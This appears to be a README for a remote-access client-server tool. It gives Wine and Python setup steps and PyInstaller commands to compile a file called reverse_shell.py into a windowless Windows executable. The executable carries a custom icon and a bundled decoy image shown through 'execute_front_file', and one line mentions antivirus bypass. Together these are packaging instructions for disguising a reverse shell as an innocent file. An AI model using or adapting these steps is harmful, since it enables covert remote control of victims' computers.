**Install Wine (win32v)**
```
$ dpkg --add-architecture i386
$ apt-get update
$ apt install wine32
```
**Install Python Interpreter**
```
download python 2.7 windows x86 MSI; in downloads dir:
$ wine msiexec /i <download_name.msi>
$ cd /root/.wine/drive_c/
$ wine /<python.exe path> -m pip install pyinstaller
```

## Development

Run server
```
$ python -m app.server.server
```
Run Client
```
$ python -m app.client.client
```

Compile Client (for testing - will not bypass AV by any means)

In client dir:
```
$ wine <windows pyinstaller.exe path> --onefile --noconsole <client filename>
```

Compilation:
To compile with specific icon:
pull .ico, or convert to ico
```
wine <windows path to pyinstaller> --onefile --noconsole --icon <path to ico> <reverse_shell.py>
```
Using `execute_front_file`:
```
Render image in arg/path for `execute_front_file` as ico
wine <windows path to pyinstaller> --add-data "<path to jpg>;." --onefile --noconsole --icon <path to ico> <reverse_shell.py>
```